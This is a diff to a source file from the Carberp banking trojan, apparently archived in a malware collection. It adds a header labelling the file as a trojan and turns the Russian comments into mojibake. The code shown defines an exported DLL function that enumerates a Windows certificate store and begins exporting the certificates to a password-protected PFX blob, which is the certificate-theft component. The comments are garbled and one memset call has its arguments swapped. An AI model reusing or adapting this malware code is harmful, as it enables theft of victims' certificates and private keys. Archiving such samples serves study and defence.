@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 // ExportSert.cpp : Defines the exported functions for the DLL application.
 //
 
@@ -17,7 +28,7 @@ extern "C" void __declspec(dllexport) GetSert( const char* nameStore, const char
 {
   HANDLE hstore = CertOpenSystemStore(NULL, nameStore);
   if( hstore != NULL ) {
-    int c_certs = 0; //количество сертификатов
+    int c_certs = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     PCCERT_CONTEXT certContext = 0;
     while( (certContext = CertEnumCertificatesInStore( hstore, certContext ) ) != NULL)
       c_certs++;
@@ -25,12 +36,12 @@ extern "C" void __declspec(dllexport) GetSert( const char* nameStore, const char
     if( c_certs == 0 )
       return;
     else {
-      //Получаем размер хранилища.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       CRYPT_DATA_BLOB pfxBlob;
       pfxBlob.pbData = NULL;
       pfxBlob.cbData = 0;
 
-      //преобразовываем пароль в WCHAR
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ WCHAR
       WCHAR wpassword[128];
       memset( wpassword, sizeof(wpassword), 0 );
       MultiByteToWideChar( CP_ACP, 0, password, -1, wpassword, sizeof(wpassword) );
